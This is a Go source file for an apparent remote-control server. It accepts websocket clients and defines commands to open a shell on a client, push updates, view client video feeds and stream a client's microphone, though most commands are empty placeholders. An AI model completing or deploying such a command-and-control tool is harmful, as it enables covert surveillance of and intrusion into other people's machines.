package main

import (
	"flag"
	"fmt"
	"net/http"
	"strconv"
	"time"

	"github.com/gorilla/websocket"
	"gopkg.in/abiosoft/ishell.v2"
)

var port = flag.String("port", "8080", "Inbound connection port.")
var database = flag.String("db", "", "File path for persistent JSON file.")

var shell = ishell.New()

var upgrader = websocket.Upgrader{}

func main() {
	flag.Parse()

	go startServer()

	shell.Println(`
 _______  _______  _______  ______    _______  _______  __   __  _______
|       ||       ||   _   ||    _ |  |       ||       ||  |_|  ||       |
|    ___||    ___||  |_|  ||   | ||  |  _____||   _   ||       ||    ___|
|   |___ |   |___ |       ||   |_||_ | |_____ |  | |  ||       ||   |___
|    ___||    ___||       ||    __  ||_____  ||  |_|  ||       ||    ___|
|   |    |   |___ |   _   ||   |  | | _____| ||       || ||_|| ||   |___
|___|    |_______||__| |__||___|  |_||_______||_______||_|   |_||_______|
 _______  ___   __   __  _______
|       ||   | |  | |  ||       |
|    ___||   | |  |_|  ||    ___|
|   |___ |   | |       ||   |___
|    ___||   | |       ||    ___|
|   |    |   |  |     | |   |___
|___|    |___|   |___|  |_______|
`)

	shell.AddCmd(&ishell.Cmd{
		Name: "ping",
		Help: "Sends ping",
		Func: cmdPing,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "set_filter",
		Help: "Sets global filters for subsequent commands (ex. os=mac).",
		Func: cmdDefault,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "client_list",
		Help: "List active clients.",
		Func: cmdDefault,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "client_list_sync",
		Help: "Ping each client and sync the local list with updated data.",
		Func: cmdDefault,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "client_update",
		Help: "Updates clients, per filter, with the given update file.",
		Func: cmdDefault,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "shell",
		Help: "Opens shell on a specific client.",
		Func: cmdDefault,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "upload",
		Help: "Uploads the given file path to the ipfs client network.",
		Func: cmdDefault,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "file_list",
		Help: "List files in client ipfs network.",
		Func: cmdDefault,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "monitor",
		Help: "Open a video grid from clients that match the filter.",
		Func: cmdDefault,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "listen",
		Help: "Open an audio stream from a client microphone.",
		Func: cmdDefault,
	})

	shell.Run()
}

func acceptClient(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		REPLLog(fmt.Sprintf("Connection Issue: %s", err.Error()))
		return
	}

	conn := &Conn{send: make(chan []byte, 256), ws: ws}
	go conn.writePump()

	REPLLog("Client connected!")

	var client *Client
	var cid int64 = 0

	if r.Header.Get("X-Client-ID") != "" {
		cid, err = strconv.ParseInt(r.Header.Get("X-Client-ID"), 10, 64)
	}

	client, err = ClientIndex.getClientByID(cid)
	if err != nil {
		client = ClientIndex.addClient(0, conn)
		client.Send("Welcome, New Client")
	}

	conn.readCallback = func(conn *Conn, message string) {
		//client.Connection.send <- []byte("Active")

		//conn.readCallback = nil
	}

	conn.readPump()
}

func REPLLog(message string) {
	shell.Println("[LOG]: " + message)
}

func startServer() {
	if *database != "" {
		if err := ClientIndex.fileLoad(*database); err != nil {
			fmt.Println(err.Error())
		}

		go func() {
			for {
				dur, _ := time.ParseDuration("5m")
				time.Sleep(dur)

				if err := ClientIndex.fileSave(*database); err != nil {
					fmt.Println(err.Error())
				}
			}
		}()
	}

	dur, _ := time.ParseDuration("2s")
	time.Sleep(dur)

	REPLLog("Starting server and accepting connections...")

	http.HandleFunc("/ready", acceptClient)
	http.ListenAndServe("localhost:"+*port, nil)
}
